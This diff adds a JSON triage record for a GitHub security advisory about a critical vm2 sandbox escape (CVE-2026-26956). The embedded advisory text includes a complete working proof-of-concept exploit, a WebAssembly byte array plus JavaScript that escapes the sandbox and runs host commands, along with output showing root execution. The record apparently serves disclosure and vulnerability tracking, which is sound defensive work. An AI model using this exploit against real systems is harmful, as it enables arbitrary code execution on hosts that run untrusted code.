@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/179028367?v=4\", \"events_url\": \"https://api.github.com/users/0x5t/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/0x5t/followers\", \"following_url\": \"https://api.github.com/users/0x5t/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/0x5t/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/0x5t\", \"id\": 179028367, \"login\": \"0x5t\", \"node_id\": \"U_kgDOCqvBjw\", \"organizations_url\": \"https://api.github.com/users/0x5t/orgs\", \"received_events_url\": \"https://api.github.com/users/0x5t/received_events\", \"repos_url\": \"https://api.github.com/users/0x5t/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/0x5t/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/0x5t/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/0x5t\", \"user_view_type\": \"public\"}}, {\"type\": \"analyst\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/71545489?v=4\", \"events_url\": \"https://api.github.com/users/Wenxin-Jiang/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Wenxin-Jiang/followers\", \"following_url\": \"https://api.github.com/users/Wenxin-Jiang/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Wenxin-Jiang/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Wenxin-Jiang\", \"id\": 71545489, \"login\": \"Wenxin-Jiang\", \"node_id\": \"MDQ6VXNlcjcxNTQ1NDg5\", \"organizations_url\": \"https://api.github.com/users/Wenxin-Jiang/orgs\", \"received_events_url\": \"https://api.github.com/users/Wenxin-Jiang/received_events\", \"repos_url\": \"https://api.github.com/users/Wenxin-Jiang/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Wenxin-Jiang/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Wenxin-Jiang/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Wenxin-Jiang\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-26956\", \"cvss\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-94\", \"name\": \"Improper Control of Generation of Code ('Code Injection')\"}, {\"cwe_id\": \"CWE-693\", \"name\": \"Protection Mechanism Failure\"}], \"description\": \"## Summary\\n\\nFull sandbox escape with arbitrary code execution. Attacker code inside `VM.run()` obtains host process object and runs host commands with zero host cooperation.\\n\\n## Details\\n\\n**Confirmed on:** vm2 3.10.4, Node.js v25.6.1 (x64 Linux)\\n**Trigger:** Attacker-controlled code passed to `VM.run()`\\n**Requires:** Node.js version with WebAssembly exception handling + JSTag support (tested on v25.6.1)\\n\\nvm2's sandbox security relies on two JavaScript-level mechanisms: (1) a code transformer that injects `handleException()` into JS `catch` clauses to wrap host-realm errors, and (2) bridge Proxies that wrap cross-context objects. Both operate entirely within JavaScript.\\n\\nWebAssembly's `try_table` instruction with a `JSTag` catch handler catches JavaScript exceptions at V8's C++ level — below JavaScript entirely. When an imported JS function throws a TypeError produced by Symbol-to-string coercion during stack formatting (`e.name = Symbol(); e.stack`), the WASM `try_table` catches it as an opaque `externref` and returns it as a normal function return value. This WASM exception-handling-to-return-value path is not sanitized by vm2 — the host-realm TypeError reaches attacker code unsanitized. Its constructor chain (`hostError.constructor.constructor`) resolves to a Function that returns the host process object, allowing for reflection outside of the vm2 context, leading to code execution.\\n\\n## PoC\\n\\n```js\\nconst { VM } = require(\\\"vm2\\\");\\nconsole.log(\\\"vm2:\\\", require(\\\"vm2/package.json\\\").version, \\\"| node:\\\", process.version);\\n\\nnew VM().run(`\\n    const before = typeof process;\\n\\n    const err = new Error(\\\"x\\\");\\n    err.name = Symbol();\\n\\n    const wasm = new Uint8Array([\\n        0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,\\n        0x01,0x0c,0x03,0x60,0x00,0x00,0x60,0x00,0x01,0x6f,0x60,0x01,0x6f,0x00,\\n        0x02,0x19,0x02,\\n        0x03,0x65,0x6e,0x76,0x07,0x74,0x72,0x69,0x67,0x67,0x65,0x72,0x00,0x00,\\n        0x02,0x6a,0x73,0x03,0x74,0x61,0x67,0x04,0x00,0x02,\\n        0x03,0x02,0x01,0x01,\\n        0x07,0x0f,0x01,\\n        0x0b,0x63,0x61,0x74,0x63,0x68,0x5f,0x65,0x72,0x72,0x6f,0x72,0x00,0x01,\\n        0x0a,0x12,0x01,0x10,0x00,\\n        0x02,0x6f,0x1f,0x40,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x0b,0x00,0x0b,0x0b\\n    ]);\\n\\n    const instance = new WebAssembly.Instance(\\n        new WebAssembly.Module(wasm),\\n        { env: { trigger() { err.stack; } }, js: { tag: WebAssembly.JSTag } }\\n    );\\n\\n    const hostError = instance.exports.catch_error();\\n    const p = hostError.constructor.constructor(\\\"return process\\\")();\\n    const id = p.mainModule.require(\\\"child_process\\\").execSync(\\\"id\\\").toString().trim();\\n    const log = p.mainModule.require(\\\"console\\\").log;\\n    log(\\\"\\\");\\n    log(\\\"process before escape:\\\", before);\\n    log(\\\"process after escape: \\\", typeof p);\\n    log(\\\"host pid:             \\\", p.pid);\\n    log(\\\"host node version:    \\\", p.version);\\n    log(\\\"RCE:                  \\\", id);\\n`);\\n```\\n\\n```\\n> node poc.js\\nvm2: 3.10.4 | node: v25.6.1\\n\\nprocess before escape: undefined\\nprocess after escape:  object\\nhost pid:              217\\nhost node version:     v25.6.1\\nRCE:                   uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\\n```\\n\\n**Proof files**\\n[poc.js](https://github.com/user-attachments/files/25285089/poc.js)\", \"epss\": {\"percentage\": 0.00921, \"percentile\": 0.55812}, \"ghsa_id\": \"GHSA-ffh4-j6h5-pg66\", \"github_reviewed_at\": \"2026-05-05T16:44:16Z\", \"html_url\": \"https://github.com/advisories/GHSA-ffh4-j6h5-pg66\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-ffh4-j6h5-pg66\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-26956\"}], \"nvd_published_at\": \"2026-05-04T17:16:22Z\", \"published_at\": \"2026-05-05T16:44:16Z\", \"references\": [\"https://github.com/patriksimek/vm2/security/advisories/GHSA-ffh4-j6h5-pg66\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-26956\", \"https://github.com/patriksimek/vm2/releases/tag/v3.10.5\", \"https://github.com/advisories/GHSA-ffh4-j6h5-pg66\"], \"repository_advisory_url\": \"https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-ffh4-j6h5-pg66\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/patriksimek/vm2\", \"summary\": \"VM2 Has a WASM Sandbox Escape\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T15:38:51Z\", \"url\": \"https://api.github.com/advisories/GHSA-ffh4-j6h5-pg66\", \"vulnerabilities\": [{\"first_patched_version\": \"3.10.5\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vm2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.10.4\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-ffh4-j6h5-pg66",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vm2: <= 3.10.4"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-26956"
+    ],
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vm2"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.460475Z",
+  "provenance": {
+    "content_sha256": "f45920a813f60a5fabab77dcbfc230e84c4540ee9a9af74102415d89cb86d59b",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-05T16:44:16Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-ffh4-j6h5-pg66",
+  "status": "active",
+  "title": "VM2 Has a WASM Sandbox Escape",
+  "updated_at": "2026-06-08T15:38:51Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-ffh4-j6h5-pg66"
+}
